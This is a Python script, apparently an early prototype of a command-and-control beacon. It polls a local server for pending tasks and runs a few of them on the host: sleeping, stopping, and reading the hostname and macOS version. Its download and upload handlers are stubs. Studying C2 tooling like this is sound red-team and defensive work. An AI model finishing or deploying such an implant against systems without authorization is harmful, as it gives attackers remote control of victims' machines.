import requests
import sys
from datetime import datetime
import os
import time

btoken = ""
baseurl = "http://localhost:8080"

def main(argv):
	if len(argv) != 3:
		print("Usage: $ python3 beacon.py <id> <beacon token>")
	else:
		baseurl = "http://localhost:8080"
		url = baseurl + "/beacon/command"

		btoken = argv[2]
		bid = argv[1]

		print(btoken)
		print(bid)

		data = {
			"beacon": {
				"id": bid,
				"token": btoken,
			},
			"status": "all",
		}
		data =  {"beacon": {"id": bid, "token": btoken},"status": "pending"}

		headers = {"Content-Type": "application/json; charset=utf-8"}
		response = requests.post(url, headers=headers, json=data)

		print(response.status_code)
		print(response.json())
		
		commands = response.json()
		executed = []

		recv_time = datetime.now()
		recv_time_str = recv_time.strftime("%d/%m/%Y %H:%M:%S")

		for com in commands:
			print(com)
			command_type = com["type"]
			content = com["content"]
			print(command_type)
			print(content)
			com["received_time"] = recv_time_str
			if command_type == "SLEEP":
				time.sleep(int(content))
			elif command_type == "STOP":
				print("quitting")
				quit()
			elif command_type == "GETHOSTNAME":
				print(os.popen("hostname").read())
			elif command_type == "GETHOSTOSNAME":
				print(os.popen("sw_vers -productVersion").read())
			elif command_type == "DOWNLOAD":
				print("pending")
			elif command_type == "UPLOAD":
				print("pending")
			executed.append(com)
if __name__ == "__main__":
    main(sys.argv)